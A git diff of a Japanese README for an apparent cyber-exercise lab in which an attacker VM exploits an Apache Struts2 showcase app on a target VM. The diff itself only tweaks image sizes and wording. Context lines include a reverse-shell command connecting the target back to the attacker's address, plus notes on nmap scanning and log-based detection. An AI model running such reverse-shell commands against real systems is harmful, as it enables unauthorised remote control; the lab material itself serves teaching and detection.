@@ -45,7 +45,7 @@ $ vagrant ssh attacker <br>
 	ii.$ sudo docker-compose up --build  <br> 
 	iii. Browse to ht&#8203;tp://attacker.cyexc-attacker:8081/  <br>
 <br>
-  <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/screenshot.png" width=300 title="Screenshot">
+  <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/screenshot.png" width=250 title="Screenshot">
   
   URLに`http://target.cyexc-target/struts2-showcase-2.3.12/index.action`と入力する。 <br>
   CMDはTarget OSで実行したいシェルコマンドを入力する。 <br>
@@ -53,7 +53,7 @@ $ vagrant ssh attacker <br>
   Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。 
   以下はReverse ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。 
 
-<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/reverseshell_terminal.png" heigh="400" title="スクリーンショット">
+<img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/reverseshell_terminal.png" width="400" title="スクリーンショット">
 
 ## nmapについて
 nmapは、ネットワーク調査ツールおよびセキュリティ/ポートスキャンツールである。どこのサーバからどのようにネットワークが構成されているのかを外部から調べることができる。
@@ -96,12 +96,13 @@ MAC Address: 08:00:27:A1:5A:8A (Cadmus Computer Systems)
 ```
 
 ## proxyサーバログの検知
-Struts2脆弱性はWEBアプリケーションの脆弱性であるため、proxyログでStruts2脆弱性の攻撃は検知できない。
+Struts2脆弱性はWEBアプリケーションの脆弱性であるため、proxyログでStruts2脆弱性攻撃は検知できなかった。
 
 取得したログはこちら＠[proxy.log](https://github.com/CyExc/CyExc/blob/master/2017/ex1/logs/proxy.log)
 
 ## proxyサーバでHTTP通信をキャプチャ
-実際にどのようなことが起きているのかは、WEBサーバのログで確認する。
+WEBサーバのログで事象を確認する。
+
 1. proxyサーバにログイン
 ```
 vagrant@webgoat:~/apps$ sudo docker-compose exec proxy bash
